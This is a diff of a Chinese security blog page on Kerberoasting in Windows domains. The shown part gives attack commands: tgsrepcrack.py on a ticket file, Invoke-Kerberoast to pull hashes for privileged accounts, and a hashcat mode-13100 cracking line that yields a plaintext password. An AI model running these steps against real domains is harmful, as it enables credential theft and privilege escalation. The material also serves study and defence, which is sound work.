 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python tgsrepcrack.py wordlist.txt 0-40e00000-Administrator@krbtgt~CORP.VK.LOCAL-CORP.VK.LOCAL.kirbi</span><br></pre></td></tr></table></figure>
-<h1 id="二、使用Powershell实现"><a href="#二、使用Powershell实现" class="headerlink" title="二、使用Powershell实现"></a>二、使用Powershell实现</h1><p>自动实现，并且不需要mimikatz，普通用户权限即可，参考资料：</p>
+<h1 id="&#x4E8C;&#x3001;&#x4F7F;&#x7528;Powershell&#x5B9E;&#x73B0;"><a href="#&#x4E8C;&#x3001;&#x4F7F;&#x7528;Powershell&#x5B9E;&#x73B0;" class="headerlink" title="&#x4E8C;&#x3001;&#x4F7F;&#x7528;Powershell&#x5B9E;&#x73B0;"></a>&#x4E8C;&#x3001;&#x4F7F;&#x7528;Powershell&#x5B9E;&#x73B0;</h1><p>&#x81EA;&#x52A8;&#x5B9E;&#x73B0;&#xFF0C;&#x5E76;&#x4E14;&#x4E0D;&#x9700;&#x8981;mimikatz&#xFF0C;&#x666E;&#x901A;&#x7528;&#x6237;&#x6743;&#x9650;&#x5373;&#x53EF;&#xFF0C;&#x53C2;&#x8003;&#x8D44;&#x6599;&#xFF1A;</p>
 <p><a href="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</a></p>
-<p>使用<code>System.IdentityModel.Tokens.KerberosRequestorSecurityToken</code>请求TGS，在返回结果中提取出TGS，输出的TGS可选择John the Ripper或Hashcat进行破解</p>
-<p>实例演示：</p>
-<p>在域内一台主机上以普通用户权限执行：</p>
+<p>&#x4F7F;&#x7528;<code>System.IdentityModel.Tokens.KerberosRequestorSecurityToken</code>&#x8BF7;&#x6C42;TGS&#xFF0C;&#x5728;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x4E2D;&#x63D0;&#x53D6;&#x51FA;TGS&#xFF0C;&#x8F93;&#x51FA;&#x7684;TGS&#x53EF;&#x9009;&#x62E9;John the Ripper&#x6216;Hashcat&#x8FDB;&#x884C;&#x7834;&#x89E3;</p>
+<p>&#x5B9E;&#x4F8B;&#x6F14;&#x793A;&#xFF1A;</p>
+<p>&#x5728;&#x57DF;&#x5185;&#x4E00;&#x53F0;&#x4E3B;&#x673A;&#x4E0A;&#x4EE5;&#x666E;&#x901A;&#x7528;&#x6237;&#x6743;&#x9650;&#x6267;&#x884C;&#xFF1A;</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl</span><br></pre></td></tr></table></figure>
-<p>-AdminCount表示选择高权限的用户</p>
-<p>输出结果如下图</p>
-<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/2-2.png" alt=""></p>
-<p>只提取Hash：</p>
+<p>-AdminCount&#x8868;&#x793A;&#x9009;&#x62E9;&#x9AD8;&#x6743;&#x9650;&#x7684;&#x7528;&#x6237;</p>
+<p>&#x8F93;&#x51FA;&#x7ED3;&#x679C;&#x5982;&#x4E0B;&#x56FE;</p>
+<p><a class="magnific-img" href="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/2-2.png"><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/2-2.png" alt="" class="ui centered image"></a></p>
+<p>&#x53EA;&#x63D0;&#x53D6;Hash&#xFF1A;</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation</span><br></pre></td></tr></table></figure>
-<p>使用hashcat破解的参数如下：</p>
+<p>&#x4F7F;&#x7528;hashcat&#x7834;&#x89E3;&#x7684;&#x53C2;&#x6570;&#x5982;&#x4E0B;&#xFF1A;</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 /tmp/hash.txt /tmp/password.list -o found.txt --force</span><br></pre></td></tr></table></figure>
-<p>  破解结果如下图，成功获得明文口令<code>MySQLAdmin111!</code></p>
-<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/2-4.png" alt=""></p>
+<p>  &#x7834;&#x89E3;&#x7ED3;&#x679C;&#x5982;&#x4E0B;&#x56FE;&#xFF0C;&#x6210;&#x529F;&#x83B7;&#x5F97;&#x660E;&#x6587;&#x53E3;&#x4EE4;<code>MySQLAdmin111!</code></p>
+<p><a class="magnific-img" href="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/2-4.png"><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/2-4.png" alt="" class="ui centered image"></a></p>
 
-  </div>
-</article>
+                        
+                    </div>
 
+                    
+                    
+                    
 
+                    <div class="description post-description">
+    <span class="post-description-item">
+        <time datetime="2019-04-02T13:50:00.000Z" itemprop="datePublished">2019-04-02</time>
 
+    </span>
+    <span class="post-description-item">
         
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="/c1y2m3.github.io/">主页</a></li>
-         
-          <li><a href="/c1y2m3.github.io/About/">关于</a></li>
-         
-          <li><a href="/c1y2m3.github.io/archives/">文章</a></li>
-         
-          <li><a href="/c1y2m3.github.io/projects_url">生活</a></li>
-        
-      </ul>
-    </div>
-
-    <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#基本概念"><span class="toc-number">1.</span> <span class="toc-text">基本概念</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SPN的格式："><span class="toc-number">2.</span> <span class="toc-text">SPN的格式：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#查询SPN"><span class="toc-number">3.</span> <span class="toc-text">查询SPN</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Kerberos的原理："><span class="toc-number">4.</span> <span class="toc-text">Kerberos的原理：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2、Windows系统通过SPN查询获得服务和服务实例账户的对应关系"><span class="toc-number">5.</span> <span class="toc-text">2、Windows系统通过SPN查询获得服务和服务实例账户的对应关系</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Kerberoasting的实现方法"><span class="toc-number">6.</span> <span class="toc-text">Kerberoasting的实现方法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#破解："><span class="toc-number">7.</span> <span class="toc-text">破解：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#二、使用Powershell实现"><span class="toc-number">8.</span> <span class="toc-text">二、使用Powershell实现</span></a></li></ol>
-    </div>
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/04/02/15542127307091/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/04/02/15542127307091/&text=域渗透之Kerberoasting攻击"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/04/02/15542127307091/&title=域渗透之Kerberoasting攻击"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/04/02/15542127307091/&is_video=false&description=域渗透之Kerberoasting攻击"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=域渗透之Kerberoasting攻击&body=Check out this article: http://yoursite.com/2019/04/02/15542127307091/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/04/02/15542127307091/&title=域渗透之Kerberoasting攻击"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/04/02/15542127307091/&title=域渗透之Kerberoasting攻击"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/04/02/15542127307091/&title=域渗透之Kerberoasting攻击"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/04/02/15542127307091/&title=域渗透之Kerberoasting攻击"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/04/02/15542127307091/&name=域渗透之Kerberoasting攻击&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
-
-  </div>
+    </span>
 </div>
 
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy; 2019 John Doe
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-         
-          <li><a href="/c1y2m3.github.io/">主页</a></li>
-         
-          <li><a href="/c1y2m3.github.io/About/">关于</a></li>
-         
-          <li><a href="/c1y2m3.github.io/archives/">文章</a></li>
-         
-          <li><a href="/c1y2m3.github.io/projects_url">生活</a></li>
-        
-      </ul>
-    </nav>
-  </div>
-</footer>
+                </div>
+                
+                <div id="pagination" class="nav-web ui text container pagination">
+
+    <div class="ui stackable two column divided grid container">
+        <div class="row">
+            <div class="column nav-left">
+                
+
+                <a href="/c1y2m3.github.io/2019/04/04/15543609538285/" class="ui tiny button">
+
+                    <i class="angle left icon"></i>
+                    
+                    JSP Shell Bypass WAF
+                    
+
+                </a>
+
+                
+            </div>
+            <div class="column nav-right">
+                
+
+                <a href="/c1y2m3.github.io/2019/03/16/----1/" class="ui tiny button">
+                    
+                    记一次域渗透攻击测试
+                    
+                    <i class="angle right icon"></i></a>
+                
+            </div>
+        </div>
+    </div>
+
+</div>
+                
+            </div>
+
+            
+            <div class="three wide computer three wide tablet column">
+
+                <div class="ui sticky article-toc" id="article-toc">
+                    <!-- toc -->
+                    <ol class="ui ordered list"><li><a href="#基本概念"><span>基本概念</span></a></li><li><a href="#SPN的格式："><span>SPN的格式：</span></a></li><li><a href="#查询SPN"><span>查询SPN</span></a></li><li><a href="#Kerberos的原理："><span>Kerberos的原理：</span></a></li><li><a href="#2、Windows系统通过SPN查询获得服务和服务实例账户的对应关系"><span>2、Windows系统通过SPN查询获得服务和服务实例账户的对应关系</span></a></li><li><a href="#Kerberoasting的实现方法"><span>Kerberoasting的实现方法</span></a></li><li><a href="#破解："><span>破解：</span></a></li><li><a href="#二、使用Powershell实现"><span>二、使用Powershell实现</span></a></li></ol>
+                </div>
+
+            </div>
+            
+
+        </div>
+    </div>
+</div>
+
+
+                    <!--</div>-->
+                <!--</div>-->
+            <!--</div>-->
+        </div>
+        <div class="ui vertical footer segment">
+    <div class="ui center aligned container">
+        <div class="ui inverted section divider"></div>
+        &copy; 2019 <a href="/">John Doe</a>,
+        Powered by <a href="https://github.com/henryhuang/hexo-theme-aloha" target="_blank">Aloha</a> and <a href="http://hexo.io/" target="_blank">Hexo</a>.
+    </div>
+</div>
 
     </div>
+
+
+
+
+<!-- scripts list from theme config.yml -->
+
+<script src="//cdn.bootcss.com/jquery/3.1.0/jquery.min.js"></script>
+
+<script src="//cdn.bootcss.com/semantic-ui/2.2.4/semantic.min.js"></script>
+
+<script src="//cdn.bootcss.com/algoliasearch/3.18.1/algoliasearch.min.js"></script>
+
+<script src="//cdn.bootcss.com/algoliasearch-helper-js/2.13.0/algoliasearch.helper.min.js"></script>
+
+<script src="/c1y2m3.github.io/js/semantic-ui-algolia.js"></script>
+
+<script src="/c1y2m3.github.io/js/aloha-events.js"></script>
+
+
+
 </body>
 </html>
-<!-- styles -->
-<link rel="stylesheet" href="/c1y2m3.github.io/lib/font-awesome/css/all.min.css">
-<link rel="stylesheet" href="/c1y2m3.github.io/lib/justified-gallery/css/justifiedGallery.min.css">
-
-<!-- jquery -->
-<script src="/c1y2m3.github.io/lib/jquery/jquery.min.js"></script>
-<script src="/c1y2m3.github.io/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
-<script src="/c1y2m3.github.io/js/main.js"></script>
-<!-- search -->
-
-<!-- Google Analytics -->
-
-<!-- Baidu Analytics -->
-
-<!-- Disqus Comments -->
-
-
